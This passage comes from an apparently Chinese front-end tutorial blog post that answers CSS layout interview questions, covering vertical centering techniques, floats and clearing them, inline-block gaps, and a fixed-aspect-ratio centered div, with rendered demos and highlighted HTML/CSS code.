text-align:center;color:white&quot;</span>&gt;</span>父元素设置flex布局实现水平居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>flex布局真的很强，子元素实际上没有设置任何有效属性。父元素设置成flex布局，一个<code>justify-content:center</code>直接水平居中。</p></li></ol><p>接下去我们看看垂直居中</p><ol><li><p>如果是父块元素中的一行 内联元素/行内元素，比如 span 标签，我们直接将行高设置为父块元素的高度即可。</p> <div style="box-sizing:content-box; line-height:50px; text-align:center; height:50px; border:5px dotted violet;">     <span>wuuconix yyds</span> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;line-height:50px; text-align:center; height:50px; border:5px dotted violet;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>wuuconix yyds<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当然了，我们都把行高设置成这么大了，这只适用于文字量很少，只有一行的情况下，如果有两行的话，第二行就会到父div外面。</p></li><li><p>父子块级元素 绝对定位 + 负外边距实现垂直居中</p> <div style="position:relative; height: 50px; border: 5px dotted violet">     <div style="position:absolute; top:50%; left:50%; margin-left:-150px; margin-top:-16px; width:300px; height:32px; background-color:indianred; text-align:center; line-height:32px;color:white">绝对定位+负外边距实现垂直居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:relative; height: 50px; border: 5px dotted violet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; top:50%; left:50%; margin-left:-150px; margin-top:-16px; width:300px; height:32px; background-color:indianred; text-align:center; line-height:32px;color:white&quot;</span>&gt;</span>绝对定位+负外边距实现垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>由于处于好看考虑，这里在实现垂直居中的同时顺手都实现了水平居中。绝对定位 + 负外边距的技术和之前水平居中的<strong>3</strong>号方法一致，不过多介绍。这次多提一嘴，这个实例中实际上包含两个垂直居中。第一个父div和子div的垂直居中，利用绝对定位+负外边距技术，还有一个是子div和里面的textContent的垂直居中，利用了<strong>1</strong>号行高的方法。</p></li><li><p>父子块级元素 绝对定位 + transform:translateY(-50%) 实现垂直居中</p> <div style="position:relative; height: 50px; border: 5px dotted violet">     <div style="position:absolute; top:50%; left:50%; transform:translateY(-50%) translateX(-50%); width:300px; height:32px; background-color:brown; text-align:center; line-height:32px;color:white">绝对定位+translateY实现垂直居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:relative; height: 50px; border: 5px dotted violet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; top:50%; left:50%; transform:translateY(-50%) translateX(-50%); width:300px; height:32px; background-color:brown; text-align:center; line-height:32px;color:white&quot;</span>&gt;</span>绝对定位+translateY实现垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>和水平居中<strong>4</strong>号方法同理，不赘述。</p></li><li><p>父子块级元素 绝对定位 + top:0; bottom:0 + 上下auto实现垂直</p> <div style="position:relative; height: 50px; border: 5px dotted violet">     <div style="position:absolute; top:0; bottom:0; left:0; right:0; margin:auto; width:300px; height:32px; background-color:darkgoldenrod; text-align:center; line-height:32px;color:white">绝对定位+top:0;bottom:0+上下auto实现垂直居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:relative; height: 50px; border: 5px dotted violet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:absolute; top:0; bottom:0; left:0; right:0; margin:auto; width:300px; height:32px; background-color:darkgoldenrod; text-align:center; line-height:32px;color:white&quot;</span>&gt;</span>绝对定位+top:0;bottom:0+上下auto实现垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个方法很妙，着重讨论一下。首先它基于绝对定位，然后我们将 top和bottom都设置为了0，这实际上是很奇怪的，因为这意味着子div元素顶部和底部都应该紧贴着父元素，但是这貌似是不可能的，因为子元素的高度小于父元素的高度。但是我们这里又设置了<code>margin:auto</code>，这会发生什么效果呢？浏览器将自动设置合适的外边距，让子元素顶着父元素，最终实现了垂直居中的效果。实际上这种思想也完全适用于水平居中【实际上这个例子里也是这样实现水平居中的】</p></li><li><p>父子块元素 父flex+子全auto实现垂直居中</p> <div style="display:flex; position:relative; height: 50px; border: 5px dotted violet">     <div style="margin:auto; width:300px; height:32px; background-color:hotpink; text-align:center; line-height:32px">父flex+子全auto实现垂直居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:flex; position:relative; height: 50px; border: 5px dotted violet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin:auto; width:300px; height:32px; background-color:hotpink; text-align:center; line-height:32px&quot;</span>&gt;</span>父flex+子全auto实现垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>flex布局总是带给我们惊喜，回顾一下我们的<strong>4</strong>号方法，margin: auto的妙处。我们需要将top和bottom全部设置为0才能实现垂直居中。但是看这个实例，我们只需要将父元素设置为flex布局，然后子元素啥都不用干，也不用设置绝对定位，只需要优雅的使用 margin: auto，一切将水到渠成。</p></li><li><p>父table子table-cell 利用 verticle_align 垂直居中</p> <div style="display:table; height: 50px; border: 5px dotted violet; width: 100%">     <div style="display:table-cell; vertical-align:middle; width:300px; height:32px; background-color:darkseagreen; text-align:center; color: black">父table子table-cell垂直居中</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:table; height: 50px; border: 5px dotted violet; width: 100%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:table-cell; vertical-align:middle; width:300px; height:32px; background-color:darkseagreen; text-align:center; color: black&quot;</span>&gt;</span>父table子table-cell垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们的目的是我们已经听到很久的属性<code>vertical-align</code>，听这名字我们就知道它生来为了垂直居中。但是可惜的是，它的使用及其严格，首先父元素需要时是一个table，然后子元素是table-cell或者是一个内联元素。该例子演示的是一个 table-cell的情况。值得注意的是，转化为table-cell后貌似产生了副作用，如你所看到的，子元素的长和宽都被拉到的父元素的长宽。</p></li><li><p>父table子内联元素/行内元素 利用 vertical_align 垂直居中</p> <div style="display:table; height:50px; border:5px dotted violet; width: 100%">     <p style="vertical-align:middle; background-color:aqua; text-align:center; color:black; margin-top: 1em">父table子内联元素/行内元素实现垂直居中</p> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:table; height:50px; border:5px dotted violet; width: 100%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;vertical-align:middle; background-color:aqua; text-align:center; color:black&quot;</span>&gt;</span>父table子内联元素/行内元素实现垂直居中<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>和<strong>6</strong>同理。只不过因为 p 本来就是内联元素，不是块元素，不需要转化为 table-cell，没有宽和长被拉伸的问题。</p></li></ol><h2 id="2-浮动布局的优点有什么缺点清除浮动有哪些方式"><a class="markdownIt-Anchor" href="#2-浮动布局的优点有什么缺点清除浮动有哪些方式"></a> 2. 浮动布局的优点？有什么缺点？清除浮动有哪些方式？</h2><p>浮动产生于标准流布局方式的局限。在标准流或者普通流中。块级元素会独占一行，然后上下排列。比如<code>&lt;br&gt;</code>和<code>&lt;p&gt;</code>，没错 p 也是一个块级元素，它也可以设置高度和宽度。 而内联元素 / 行内元素则会从左到右排序，碰到父元素边界则会自动换行。 比如 <code>&lt;span&gt;</code>和<code>&lt;a&gt;</code>等。</p><blockquote><p>但是要我说，最常见的内联元素实际上就是普通的文本，比如 p 里面包裹的内容，它们就是内联元素，这也是为什么 p 能够用 text-align 来水平居中它们的原因</p></blockquote><p>标准流很好，简洁易懂，但是人们在追求更加好看的网页设计的时候想更上一层楼，首先遇到的第一个问题就是两个块级元素 在同一行内显示的问题。我们这里拿两个<code>&lt;img&gt;</code>举例子。正常情况下它们将出现在两行。加上<code>display: inline-block</code>貌似就能解决这个问题。</p><div style="text-align:center">    <img style="display:inline-block;" src="https://url.wuuconix.link/favicon" width="150px">    <img style="display:inline-block;" src="https://url.wuuconix.link/avatar" width="150px">    <p>display:inline_block实现两个块级元素在同一行中</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:inline-block;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:inline-block;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/avatar&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>display:inline_block实现两个块级元素在同一行中<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这看上去非常不错。但是我们注意到一个奇怪的情况，就是两个图片之间貌似隔了点距离？虽然在这里这个距离刚刚好，但是在某些情况下你会被这个间距搞疯的。实际上这个间距来源于两个标签之间的换行。如果我们取消换行，这个间距就消失了。然而这会使代码可读性变差。</p><div style="text-align:center">    <img style="display:inline-block;" src="https://url.wuuconix.link/favicon" width="150px"><img style="display:inline-block;" src="https://url.wuuconix.link/avatar" width="150px">    <p>把两个img连着写可以取消缝隙</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:inline-block;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:inline-block;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/avatar&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>把两个img连着写可以取消缝隙<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果我们用float来实现就不会有这个缝隙。</p><div style="width:300px; margin: 5px auto; text-align:center">    <img style="float:left" src="https://url.wuuconix.link/favicon" width="150px">    <img style="float:left" src="https://url.wuuconix.link/avatar" width="150px">    <p>float将没有缝隙</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:300px; margin: 5px auto; text-align:center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/avatar&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>float将没有缝隙<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以到这里我们可以写下浮动的优点了：</p><ol><li><p>可以将多个块级元素在同一行里显示，在一些图文混排的场景里很常见。</p></li><li><p>与inline-block类似，但是它比inlne-block有两个好处，横向排序的时候float可以选择方向而inline-block不行，float还可以避免使用inline-block出现的缝隙问题。</p></li></ol><p>但是浮动也有一个很大的问题，最常见的就是如果父元素没有设置高度，而子元素设置了高度，在标准流中，父元素将被撑起来，而在子元素被设置为浮动后，父元素的高度将变成0，俗称父元素高度塌陷。</p><p>这里举一个例子。父元素使用边框来明确它的位置。</p><div style="border: yellowgreen dashed 3px; width:150px; margin: 5px auto">    <img src="https://url.wuuconix.link/favicon" width="150px">    <p style="text-align:center">标准流的情况 父元素的高度被撑起</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: yellowgreen dashed 3px; width:150px; margin: 5px auto&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span>标准流的情况 父元素的高度被撑起<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><div style="border: yellowgreen dashed 3px; width:150px; margin: 5px auto">    <img style="float:left" src="https://url.wuuconix.link/favicon" width="150px">    <p style="float:left; text-align:center">子元素设置float后 父元素高度坍缩</p></div><div style="clear:both"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: yellowgreen dashed 3px; width:150px; margin: 5px auto&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left; text-align:center&quot;</span>&gt;</span>子元素设置float后 父元素高度坍缩<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们如何解决这个问题呢？这就需要消除浮动。消除浮动有两种办法。</p><ol><li><p>在父元素设置<code>overflow: hidden</code>取消浮动。</p> <div style="overflow:hidden; border: yellowgreen dashed 3px; width:150px; margin: 5px auto">     <img style="float:left" src="https://url.wuuconix.link/favicon" width="150px">     <p style="float:left; text-align:center">父元素设置overflow取消浮动</p> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;overflow:hidden; border: yellowgreen dashed 3px; width:150px; margin: 5px auto&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left; text-align:center&quot;</span>&gt;</span>父元素设置overflow取消浮动<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这看起来挺奇怪的，为什么设置这个属性后就清除了浮动了呢？查询过资料后，设置overflow为hidden将触发<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context">BFC (Block Formatting<br />context) 格式化上下文</a>。而BFC的一大功能就是清除浮动。</p><p>其次我们仔细阅读MDN关于BFC的链接可以知道，只要把<code>overflow</code>设置为<code>visible</code>以外仍以的值就能触发BFC，比如<code>auto, hidden, scroll</code>都能实现清除浮动的效果。</p></li><li><p>第<strong>1</strong>种方法依赖触发BFC，比较玄学，不太好理解。更好理解的方法是在最后一个浮动的元素后面加上一个空元素，并且设置属性<code>clear:both</code>。</p> <div style="border: yellowgreen dashed 3px; width:150px; margin: 5px auto">     <img style="float:left" src="https://url.wuuconix.link/favicon" width="150px">     <p style="float:left; text-align:center">手动写一个空元素清除浮动</p>     <div style="clear:both"></div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: yellowgreen dashed 3px; width:150px; margin: 5px auto&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left; text-align:center&quot;</span>&gt;</span>手动写一个空元素清除浮动<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;clear:both&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>第<strong>2</strong>种方法看起来挺简单也好理解，但是额外的标签，容易让html结构混乱。所以我们可以使用css中的伪类<code>::after</code>来加一个空元素。</p> <style>     .outter::after {         content: "";         display: block;         clear: both;         height: 0;         visibility: hidden;     } </style> <div class="outter" style="border: yellowgreen dashed 3px; width:150px; margin: 5px auto">     <img style="float:left" src="https://url.wuuconix.link/favicon" width="150px">     <p style="float:left; text-align:center">伪类after优雅清除浮动</p> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.outter</span><span class="hljs-selector-pseudo">::after</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">        <span class="hljs-attribute">clear</span>: both;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">        <span class="hljs-attribute">visibility</span>: hidden;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;outter&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border: yellowgreen dashed 3px; width:150px; margin: 5px auto&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://url.wuuconix.link/favicon&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;150px&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float:left; text-align:center&quot;</span>&gt;</span>伪类after优雅清除浮动<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里解释一下伪类<code>::after</code>是什么意思，我们可以看到这里是被添加在父元素上的，它的作用实际上就是在父元素内部的最后元素后面再添加一个元素，而我们这里把伪类设置成了块元素，然后清除了浮动了，为了让它彻底隐形，我们还设置了其他的一些属性。<br />然后因为内联css无法添加伪类，这里使用了style标签。</p></li></ol><h2 id="3-使用displayinline-block会产生什么问题解决方法"><a class="markdownIt-Anchor" href="#3-使用displayinline-block会产生什么问题解决方法"></a> 3. 使用display:inline-block会产生什么问题？解决方法？</h2><p>这个问题在<a href="#2-浮动布局的优点有什么缺点清除浮动有哪些方式" class="tocbot-link node-name--H2">2. 浮动布局的优点？有什么缺点？清除浮动有哪些方式？</a>里面就讲过了。两个inline-block并排中间会有缝隙。</p><p>它产生缝隙的原因</p><p>元素被当成行内元素排版的时候，元素之间的空白符（空格、回车换行等）都会被浏览器处理，根据CSS中white-space属性的处理方式（默认为normal，合并多余空格），html代码中的回车被转化为一个空白符，在字体不为0的情况下，空白符占据一定宽度，所以就出现了缝隙。</p><p>解决方法</p><ol><li><p>写标签时不换行。【强迫症的噩梦】</p></li><li><p>父元素设置<code>font-size: 0</code>，在子元素上重新设置正确的<code>font-size</code>。</p> <div style="font-size:0; text-align: center;">     <div style="font-size: 16px; display: inline-block; width: 150px; background-color: violet">123</div>     <div style="font-size: 16px; display: inline-block; width: 150px; background-color: hotpink">123</div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size:0; text-align: center;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 16px; display: inline-block; width: 150px; background-color: violet; color:white&quot;</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 16px; display: inline-block; width: 150px; background-color: hotpink; color:white&quot;</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个方法很妙，把中间的空白元素的字体设置为零。</p></li><li><p>使用float布局，具体参考 <a href="#2-浮动布局的优点有什么缺点清除浮动有哪些方式" class="tocbot-link node-name--H2">2. 浮动布局的优点？有什么缺点？清除浮动有哪些方式？</a></p></li></ol><h2 id="4-布局题div垂直居中左右10px高度始终为宽度一半"><a class="markdownIt-Anchor" href="#4-布局题div垂直居中左右10px高度始终为宽度一半"></a> 4. 布局题：div垂直居中，左右10px，高度始终为宽度一半</h2><p>题目描述：实现一个div垂直居中, 其距离屏幕左右两边各10px, 其高度始终是宽度的50%。同时div<br />中有一个文字A，文字需要水平垂直居中。</p><p>这道题看起来比较简单，就是一个div在窗口内垂直居中，然后这个div内部一个文字A垂直水平居中。但是它有一个奇怪的条件，让div的高度始终时宽度的50%。这貌似是无法达成的，因为CSS中可没有变量这种东西，宽度是会变的，而高度的值需要来自于一个变量，这很奇怪。</p><p>有两个方法可以解决这个看似无解的问题。</p><ol><li><p>我们用<code>height:0; padding-bottom:50%</code>这个黑科技来实现。</p><p>因为<code>padding-bottom</code>的百分比是基于父元素的width来的，我们让div的 content的高度为0，而用下内边距来实现把高度设置为宽度的一半。</p> <div style="height: 100%; margin: 0 10px; display: flex; align-items: center">     <div style="height: 0; padding-bottom: 50%; width: 100%; background-color: orange; position: relative">         <div style="position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center">A</div>     </div> </div> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 100%; margin: 0 10px; display: flex; align-items: center&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 0; padding-bottom: 50%; width: 100%; background-color: orange; position: relative&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span 